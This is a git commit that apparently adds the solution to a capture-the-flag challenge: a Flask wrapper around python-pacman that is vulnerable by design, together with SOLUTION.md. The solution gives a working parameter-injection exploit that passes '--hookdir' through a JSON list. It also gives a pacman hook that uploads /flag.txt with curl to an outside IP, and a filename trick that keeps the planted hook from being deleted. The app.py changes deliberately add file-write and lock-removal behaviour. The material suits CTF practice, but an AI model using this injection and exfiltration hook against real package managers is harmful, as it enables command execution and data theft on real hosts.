0ecf29ee037368d7b7df88fecc405dbd6a8ea15c
kmille <christian.schneider@androidloves.me>
2018-08-25 10:40:31 +0200

    minor changes ...

---
+++ SOLUTION.md
@@ -0,0 +1,30 @@
+# spoiler: this is the solution
+
+# 0day in python-pacman (allows parameter injection)
+
+- exploit code is: pacman.install(["--hookdir", "/tmp/pacman/", "wget"])
+- we can use json to put a list into the install function instead of a string (string is not vuln)
+- pacman hook looks like this
+
+```
+[Trigger]
+Operation = Upgrade
+Operation = Install
+Operation = Remove
+Type = Package
+Target = *
+
+[Action]
+Description = Cleaning pacman cache...
+When = PostTransaction
+Exec = /bin/bash -c "curl --upload-file /flag.txt http://192.168.178.200:4444"
+```
+
+- we need to write a file (therefore I added /check)
+- we need to throw an exception in check_output so that the remove() does not get called
+- therefore we use ' -h.hook' as filename (calls --help and returns 2)
+- hook files must end with .hook. The hook will only be executed if something will be installed (check if it's not already installed!)
+- checkout exploit.py
+
+
+
--- app.py
+++ app.py
@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify
+from functools import wraps
 import pacman
-from os import remove, makedirs
+from os import remove, makedirs, system
 from os.path import exists
 from subprocess import check_output
 from shlex import quote
@@ -12,24 +13,51 @@ tmp_dir = "/tmp/pacman/" # trailing slash!
 makedirs(tmp_dir, exist_ok=True)
 
 
+def check_json(*params):
+    def decorator(f):
+        @wraps(f)
+        def wrapper(*args, **kw):
+            system("pgrep pacman || rm /var/lib/pacman/db.lck > /dev/null 2>&1")
+            if exists("/var/lib/pacman/db.lck"):
+                return jsonify({'error': 'pacman currently in use'})
+            if not all([p in request.get_json(force=True) for p in params]):
+                return jsonify({"error": "missing parameter"}), 400
+            return f(*args, **kw)
+        return wrapper
+    return decorator
+
+
 @app.route("/info", methods=['GET', 'POST'])
+@check_json('package')
 def get_info():
-    if exists("/var/lib/pacman/db.lck"):
-        return jsonify({'error': 'pacman currently in use'})
     package = request.get_json(force=True)['package']
     return jsonify(pacman.get_info(package))
 
 
 @app.route("/install", methods=['GET', 'POST'])
+@check_json('package')
 def install():
-    if exists("/var/lib/pacman/db.lck"):
-        return jsonify({'error': 'pacman currently in use'})
     package = request.get_json(force=True)['package']
     pacman.install(package)
     return jsonify({'status': 'OK'})
     
 
+@app.route("/remove", methods=['GET', 'POST'])
+@check_json()
+def p_remove():
+    pacman.remove("wget")
+    return jsonify({'status': 'OK'})
+
+
+@app.route("/is_installed", methods=['GET', 'POST'])
+@check_json('package')
+def is_installed():
+    package = request.get_json(force=True)['package']
+    return jsonify({'is_installed': pacman.is_installed(package)})
+
+
 @app.route("/check", methods=['GET', 'POST'])
+@check_json('name', 'content')
 def checksum():
     f_name = request.get_json(force=True)['name']
     f_content = request.get_json(force=True)['content']
@@ -40,4 +68,4 @@ def checksum():
     return jsonify({'output': stdout.decode()})
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=False)
